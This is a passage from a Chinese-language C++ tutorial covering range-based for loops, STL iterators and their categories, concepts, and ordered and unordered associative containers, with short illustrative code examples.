*= <span class="number">2</span>; <span class="comment">// 将每个元素乘以 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// nums 现在是 &#123;2, 4, 6, 8&#125;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; num : nums) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 2 4 6 8</span></span><br></pre></td></tr></table></figure></li><li><strong>复制元素:</strong> 使用 <code>auto</code> (或具体类型) 会将每个元素<strong>复制</strong>到循环变量中。对循环变量的修改<strong>不会</strong>影响容器中的原始元素。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data = &#123;<span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> val : data) &#123;</span><br><span class="line">    val += <span class="number">1</span>; <span class="comment">// 只修改了副本 val，data 不变</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出 6 11 16</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; d : data) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; d &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出 5 10 15 (原始数据未变)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li></ul><p>基于范围的 for 循环极大地简化了遍历容器的代码，使其更易读、更安全（避免了迭代器失效或索引越界等常见错误）。</p><h2 id="16-4-泛型编程"><a href="#16-4-泛型编程" class="headerlink" title="16.4 泛型编程"></a>16.4 泛型编程</h2><p><strong>泛型编程 (Generic Programming)</strong> 是一种编程范式，旨在编写独立于特定数据类型的代码。其目标是创建可重用的组件（如函数或类），这些组件可以处理多种不同的数据类型，而无需为每种类型重写代码。C++ 中的<strong>模板 (Templates)</strong> 是实现泛型编程的主要机制。</p><p>标准模板库 (STL) 就是泛型编程思想的集中体现。它通过模板定义了通用的容器、算法和迭代器，使得我们可以用同样的方式操作 <code>vector&lt;int&gt;</code>, <code>list&lt;string&gt;</code> 或其他自定义类型的数据。</p><h3 id="16-4-1-为何使用迭代器"><a href="#16-4-1-为何使用迭代器" class="headerlink" title="16.4.1 为何使用迭代器"></a>16.4.1 为何使用迭代器</h3><p>STL 的设计核心是将<strong>数据存储（容器）</strong>和<strong>数据操作（算法）</strong>分离开来。但是，算法如何才能访问不同容器（如 <code>vector</code>, <code>list</code>, <code>deque</code>）中的数据呢？不同的容器内部结构可能完全不同。</p><p><strong>迭代器 (Iterators)</strong> 就是解决这个问题的关键。迭代器是一种<strong>泛化的指针</strong>，它提供了一种统一的方式来<strong>遍历</strong>容器中的元素，并访问元素的值，而<strong>无需暴露容器的内部实现细节</strong>。</p><ul><li>  <strong>抽象访问:</strong> 算法不直接操作容器，而是通过迭代器来访问容器中的元素范围。</li><li>  <strong>统一接口:</strong> 所有容器都提供符合特定标准的迭代器接口（如 <code>begin()</code>, <code>end()</code>, <code>++</code> 前进, <code>*</code> 解引用）。</li><li>  <strong>灵活性:</strong> 算法只需要知道如何使用迭代器，就可以应用于任何提供兼容迭代器的容器。例如，<code>std::sort</code> 算法可以对 <code>vector</code>, <code>deque</code> 甚至普通数组（通过指针，指针也是一种迭代器）进行排序，只要它们提供所需的迭代器类型。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt; // for std::find</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vec = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; lst = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> value_to_find = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> value_to_find_list = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">int</span> value_to_find_arr = <span class="number">300</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 std::find 算法，通过迭代器操作不同容器</span></span><br><span class="line">    <span class="keyword">auto</span> it_vec = <span class="built_in">std</span>::find(vec.begin(), vec.end(), value_to_find);</span><br><span class="line">    <span class="keyword">if</span> (it_vec != vec.end()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Found &quot;</span> &lt;&lt; value_to_find &lt;&lt; <span class="string">&quot; in vector.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> it_lst = <span class="built_in">std</span>::find(lst.begin(), lst.end(), value_to_find_list);</span><br><span class="line">    <span class="keyword">if</span> (it_lst != lst.end()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Found &quot;</span> &lt;&lt; value_to_find_list &lt;&lt; <span class="string">&quot; in list.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 普通指针也可以作为迭代器使用</span></span><br><span class="line">    <span class="keyword">int</span>* it_arr = <span class="built_in">std</span>::find(arr, arr + <span class="number">5</span>, value_to_find_arr);</span><br><span class="line">    <span class="keyword">if</span> (it_arr != arr + <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Found &quot;</span> &lt;&lt; value_to_find_arr &lt;&lt; <span class="string">&quot; in array.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，同一个 <code>std::find</code> 算法可以作用于 <code>vector</code>, <code>list</code> 和 C 风格数组，因为它操作的是迭代器（或指针）定义的范围，而不是容器本身。</p><h3 id="16-4-2-迭代器类型"><a href="#16-4-2-迭代器类型" class="headerlink" title="16.4.2 迭代器类型"></a>16.4.2 迭代器类型</h3><p>STL 定义了五种主要的迭代器类别，它们根据提供的操作能力进行区分：</p><ol><li><p><strong>输入迭代器 (Input Iterator):</strong></p><ul><li>  最基本的迭代器，只能<strong>向前</strong>移动 (<code>++</code>)。</li><li>  只能<strong>读取</strong> (<code>*</code>) 所指向的元素<strong>一次</strong>（读取后再次读取同一位置的结果未定义）。</li><li>  支持比较相等 (<code>==</code>, <code>!=</code>)。</li><li>  用于单遍扫描算法，例如 <code>std::find</code>, <code>std::accumulate</code>。<code>istream_iterator</code> 是一个例子。</li></ul></li><li><p><strong>输出迭代器 (Output Iterator):</strong></p><ul><li>  只能<strong>向前</strong>移动 (<code>++</code>)。</li><li>  只能<strong>写入</strong> (<code>*it = value</code>) 所指向的位置<strong>一次</strong>。</li><li>  不支持比较。</li><li>  用于将结果写入目标，例如 <code>std::copy</code> 的第三个参数。<code>ostream_iterator</code> 是一个例子。</li></ul></li><li><p><strong>前向迭代器 (Forward Iterator):</strong></p><ul><li>  结合了输入和输出迭代器的部分能力（但更强）。</li><li>  可以<strong>向前</strong>移动 (<code>++</code>)。</li><li>  可以<strong>多次读取</strong> (<code>*</code>) 同一个元素。</li><li>  可以<strong>多次写入</strong> (<code>*it = value</code>) 同一个元素（如果指向的是非 <code>const</code> 元素）。</li><li>  支持比较相等 (<code>==</code>, <code>!=</code>)。</li><li>  用于需要多次遍历同一范围的算法。<code>std::forward_list</code> 提供前向迭代器。<code>unordered</code> 容器也提供至少前向迭代器。</li></ul></li><li><p><strong>双向迭代器 (Bidirectional Iterator):</strong></p><ul><li>  继承了前向迭代器的所有能力。</li><li>  增加了<strong>向后</strong>移动 (<code>--</code>) 的能力。</li><li>  <code>std::list</code>, <code>std::set</code>, <code>std::map</code> 提供双向迭代器。</li></ul></li><li><p><strong>随机访问迭代器 (Random Access Iterator):</strong></p><ul><li>  最强大的迭代器，继承了双向迭代器的所有能力。</li><li>  支持<strong>算术运算</strong>：<code>it + n</code>, <code>it - n</code>, <code>it += n</code>, <code>it -= n</code> (快速移动到任意位置)。</li><li>  支持<strong>下标运算</strong>：<code>it[n]</code> (等价于 <code>*(it + n)</code>)。</li><li>  支持比较大小 (<code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>)。</li><li>  支持计算两个迭代器之间的距离 (<code>it2 - it1</code>)。</li><li>  <code>std::vector</code>, <code>std::deque</code>, <code>std::array</code>, <code>std::string</code> 提供随机访问迭代器。普通指针也是随机访问迭代器。</li></ul></li></ol><p>算法会根据其需要指定它所要求的最低迭代器类别。例如，<code>std::reverse</code> 需要双向迭代器，而 <code>std::sort</code> 需要随机访问迭代器（因为它需要高效地交换任意位置的元素）。</p><h3 id="16-4-3-迭代器层次结构"><a href="#16-4-3-迭代器层次结构" class="headerlink" title="16.4.3 迭代器层次结构"></a>16.4.3 迭代器层次结构</h3><p>这五种迭代器类型形成了一个层次结构，后面的类别拥有前面类别所有（或等价）的功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input Iterator   Output Iterator</span><br><span class="line">      \             &#x2F;</span><br><span class="line">       Forward Iterator</span><br><span class="line">            |</span><br><span class="line">     Bidirectional Iterator</span><br><span class="line">            |</span><br><span class="line">     Random Access Iterator</span><br></pre></td></tr></table></figure><p>这意味着，如果一个算法需要前向迭代器，你可以传递给它前向、双向或随机访问迭代器。但如果算法需要随机访问迭代器，你就不能传递给它双向或前向迭代器。</p><h3 id="16-4-4-概念、改进和模型-Concepts-Refinements-and-Models"><a href="#16-4-4-概念、改进和模型-Concepts-Refinements-and-Models" class="headerlink" title="16.4.4 概念、改进和模型 (Concepts, Refinements, and Models)"></a>16.4.4 概念、改进和模型 (Concepts, Refinements, and Models)</h3><p>STL 的设计基于<strong>概念 (Concepts)</strong> 的思想。一个概念是一组对类型的要求（包括类型必须提供的操作、类型别名、语义保证等）。</p><ul><li>  <strong>概念 (Concept):</strong> 例如，“迭代器”是一个概念，“可排序 (Sortable)”是一个概念，“容器”是一个概念。</li><li>  <strong>改进 (Refinement):</strong> 一个概念可以是另一个概念的改进。例如，“前向迭代器”是“输入迭代器”的改进，因为它增加了可以多次读取的要求。“双向迭代器”是“前向迭代器”的改进，增加了向后移动的要求。</li><li>  <strong>模型 (Model):</strong> 一个具体的类型如果满足了某个概念的所有要求，就称为该概念的一个**模型 (Model)**。例如，<code>std::vector&lt;int&gt;::iterator</code> 是“随机访问迭代器”概念的一个模型。<code>int</code> 类型是“可相加 (Additive)”概念的一个模型。</li></ul><p>虽然 C++ 标准本身直到 C++20 才正式引入语言级别的 Concepts 支持，但 STL 从一开始就是基于这种思想设计的。算法的文档通常会说明它对模板参数（特别是迭代器类型）的概念要求。例如，<code>std::sort</code> 要求其迭代器参数是“随机访问迭代器 (RandomAccessIterator)”的模型，并且元素类型是“可小于比较 (LessThanComparable)”和“可移动构造/赋值 (MoveConstructible/MoveAssignable)”的模型。</p><p>理解概念有助于我们知道哪些算法可以用于哪些容器或数据类型。</p><h3 id="16-4-5-容器种类"><a href="#16-4-5-容器种类" class="headerlink" title="16.4.5 容器种类"></a>16.4.5 容器种类</h3><p>STL 提供了多种容器类型，可以大致分为几类：</p><ol><li><p><strong>顺序容器 (Sequence Containers):</strong> 元素按照线性顺序排列。</p><ul><li>  <code>std::vector</code>: 动态数组，连续内存，随机访问快，尾部插入/删除快，中间插入/删除慢。</li><li>  <code>std::deque</code> (Double-Ended Queue): 双端队列，非连续内存（分块），支持随机访问，<strong>头部和尾部</strong>插入/删除都快，中间插入/删除慢。</li><li>  <code>std::list</code>: 双向链表，非连续内存，不支持随机访问（访问元素需遍历），<strong>任何位置</strong>插入/删除都快 (O(1))。</li><li>  <code>std::forward_list</code> (C++11): 单向链表，比 <code>list</code> 开销更小，只支持向前遍历，任何位置插入/删除快。</li><li>  <code>std::array</code> (C++11): <strong>固定大小</strong>数组，是对 C 风格数组的封装，连续内存，支持随机访问，大小在编译时确定，不能动态改变。</li></ul></li><li><p><strong>关联容器 (Associative Containers):</strong> 元素根据<strong>键 (Key)</strong> 进行排序和存储，查找速度通常较快 (对数时间复杂度 O(log N))。</p><ul><li>  <code>std::set</code>: 存储<strong>唯一</strong>元素的集合，自动排序。</li><li>  <code>std::map</code>: 存储**键-值对 (Key-Value Pair)**，键是唯一的，根据键自动排序。</li><li>  <code>std::multiset</code>: 类似于 <code>set</code>，但允许存储<strong>重复</strong>元素。</li><li>  <code>std::multimap</code>: 类似于 <code>map</code>，但允许存储具有<strong>相同键</strong>的多个键-值对。</li></ul></li><li><p><strong>无序关联容器 (Unordered Associative Containers) (C++11):</strong> 元素根据键的<strong>哈希值 (Hash Value)</strong> 存储在桶 (Bucket) 中，不保证元素顺序。插入、删除和查找的平均时间复杂度通常为常数时间 O(1)，但最坏情况下可能退化为线性时间 O(N)。</p><ul><li>  <code>std::unordered_set</code>: 存储唯一元素的哈希集合。</li><li>  <code>std::unordered_map</code>: 存储键-值对的哈希映射，键唯一。</li><li>  <code>std::unordered_multiset</code>: 允许重复元素的哈希集合。</li><li>  <code>std::unordered_multimap</code>: 允许重复键的哈希映射。</li></ul></li><li><p><strong>容器适配器 (Container Adapters):</strong> 基于其他容器类型实现特定接口（通常限制了底层容器的功能）。</p><ul><li>  <code>std::stack</code>: 后进先出 (LIFO) 栈，默认基于 <code>deque</code> 实现。</li><li>  <code>std::queue</code>: 先进先出 (FIFO) 队列，默认基于 <code>deque</code> 实现。</li><li>  <code>std::priority_queue</code>: 优先级队列，最大（或最小）元素总是在顶部，默认基于 <code>vector</code> 实现。</li></ul></li></ol><p>选择哪种容器取决于具体需求，如是否需要排序、是否需要快速随机访问、插入/删除的频率和位置、是否允许重复元素等。</p><h3 id="16-4-6-关联容器"><a href="#16-4-6-关联容器" class="headerlink" title="16.4.6 关联容器"></a>16.4.6 关联容器</h3><p>关联容器的核心特点是元素根据<strong>键</strong>自动排序。它们通常使用某种形式的平衡二叉搜索树（如红黑树）来实现，保证了插入、删除和查找操作的时间复杂度为 O(log N)。</p><ul><li><p><strong><code>std::set&lt;Key&gt;</code>:</strong></p><ul><li><p>  存储类型为 <code>Key</code> 的<strong>唯一</strong>元素。</p></li><li><p>  元素自动按升序排序（默认使用 <code>operator&lt;</code>）。</p></li><li><p>主要用于快速检查元素是否存在。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">set</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; unique_words;</span><br><span class="line">    unique_words.insert(<span class="string">&quot;apple&quot;</span>);</span><br><span class="line">    unique_words.insert(<span class="string">&quot;banana&quot;</span>);</span><br><span class="line">    unique_words.insert(<span class="string">&quot;apple&quot;</span>); <span class="comment">// 重复插入会被忽略</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Set contains: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; word : unique_words) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; word &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出: apple banana (已排序)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unique_words.count(<span class="string">&quot;banana&quot;</span>)) &#123; <span class="comment">// count() 返回 0 或 1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;banana is in the set.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> it = unique_words.find(<span class="string">&quot;cherry&quot;</span>); <span class="comment">// find() 返回迭代器</span></span><br><span class="line">    <span class="keyword">if</span> (it == unique_words.end()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;cherry is not in the set.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>std::map&lt;Key, Value&gt;</code>:</strong></p><ul><li><p>  存储 <code>std::pair&lt;const Key, Value&gt;</code> 类型的键-值对。</p></li><li><p>  键 <code>Key</code> 必须是<strong>唯一</strong>的。</p></li><li><p>  元素根据键自动排序。</p></li><li><p>可以通过键快速查找对应的值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">int</span>&gt; word_counts;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入方式</span></span><br><span class="line">    word_counts.insert(&#123;<span class="string">&quot;apple&quot;</span>, <span class="number">3</span>&#125;);</span><br><span class="line">    word_counts.insert(<span class="built_in">std</span>::<span class="built_in">make_pair</span>(<span class="string">&quot;banana&quot;</span>, <span class="number">5</span>));</span><br><span class="line">    word_counts[<span class="string">&quot;cherry&quot;</span>] = <span class="number">2</span>; <span class="comment">// 使用 operator[] 插入或更新</span></span><br><span class="line"></span><br><span class="line">    word_counts[<span class="string">&quot;apple&quot;</span>] = <span class="number">4</span>; <span class="comment">// 更新 apple 的值</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Map contains:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; <span class="built_in">pair</span> : word_counts) &#123;</span><br><span class="line">        <span class="comment">// pair.first 是 const Key, pair.second 是 Value</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">pair</span>.first &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; <span class="built_in">pair</span>.second &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// 输出按键排序: apple: 4, banana: 5, cherry: 2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count for banana: &quot;</span> &lt;&lt; word_counts[<span class="string">&quot;banana&quot;</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 使用 [] 访问</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> it = word_counts.find(<span class="string">&quot;grape&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (it == word_counts.end()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;grape not found.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注意：如果使用 operator[] 访问不存在的键，会自动插入一个具有默认值的元素！</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count for grape (after []): &quot;</span> &lt;&lt; word_counts[<span class="string">&quot;grape&quot;</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0，并插入了 &#123;&quot;grape&quot;, 0&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>  <strong><code>std::multiset&lt;Key&gt;</code>:</strong> 允许存储重复的键，元素自动排序。</p></li><li><p>  <strong><code>std::multimap&lt;Key, Value&gt;</code>:</strong> 允许存储重复的键，键值对根据键自动排序。查找会返回一个范围（所有具有该键的元素）。</p></li></ul><h3 id="16-4-7-无序关联容器（C-11）"><a href="#16-4-7-无序关联容器（C-11）" class="headerlink" title="16.4.7 无序关联容器（C++11）"></a>16.4.7 无序关联容器（C++11）</h3><p>无序关联容器使用<strong>哈希表 (Hash Table)</strong> 实现，元素不保证任何特定顺序。它们通过计算键的<strong>哈希值</strong>来确定元素存储的位置（桶）。</p><ul><li><p>  <strong>优点:</strong> 插入、删除和查找的<strong>平均</strong>时间复杂度为 O(1)，通常比关联容器更快。</p></li><li><p><strong>缺点:</strong></p><ul><li>  <strong>最坏</strong>情况下的时间复杂度为 O(N)（当发生大量哈希冲突时）。</li><li>  元素是无序的。</li><li>  需要为键类型提供<strong>哈希函数</strong>和<strong>相等比较</strong>操作（标准库为基本类型和 <code>string</code> 等提供了默认实现）。</li><li>  哈希表操作可能会导致迭代器失效。</li></ul></li><li><p>  <strong><code>std::unordered_set&lt;Key&gt;</code>:</strong> 存储唯一键的哈希集合。</p></li><li><p>  <strong><code>std::unordered_map&lt;Key, Value&gt;</code>:</strong> 存储唯一键值对的哈希映射。</p></li><li><p>  <strong><code>std::unordered_multiset&lt;Key&gt;</code>:</strong> 允许重复键的哈希集合。</p></li><li><p>  <strong><code>std::unordered_multimap&lt;Key, Value&gt;</code>:</strong> 允许重复键的哈希映射。</p></li></ul><p><strong>示例 (<code>unordered_map</code>):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">int</span>&gt; phonebook;</span><br><span class="line"></span><br><span class="line">    phonebook[<span class="string">&quot;Alice&quot;</span>] = <span class="number">12345</span>;</span><br><span class="line">    phonebook[<span class="string">&quot;Bob&quot;</span>] = <span class="number">67890</span>;</span><br><span class="line">    phonebook.insert(&#123;<span class="string">&quot;Charlie&quot;</span>, <span class="number">54321</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Phonebook (order not guaranteed):\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; entry : phonebook) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; entry.first &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; entry.second &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bob&#x27;s number: &quot;</span> &lt;&lt; phonebook[<span class="string">&quot;Bob&quot;</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (phonebook.count(<span class="string">&quot;David&quot;</span>)) &#123; <span class="comment">// count() 返回 0 或 1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;David found.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;David not found.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无序容器在不需要元素排序且注重平均查找性能的场景下非常有用，例如实现缓存、快速查找表等。</p><h2 id="16-5-函数对象"><a href="#16-5-函数对象" class="headerlink" title="16.5 函数对象"></a>16.5 函数对象</h2><p>在 STL 中，许多算法（如 <code>sort</code>, <code>find_if</code>, 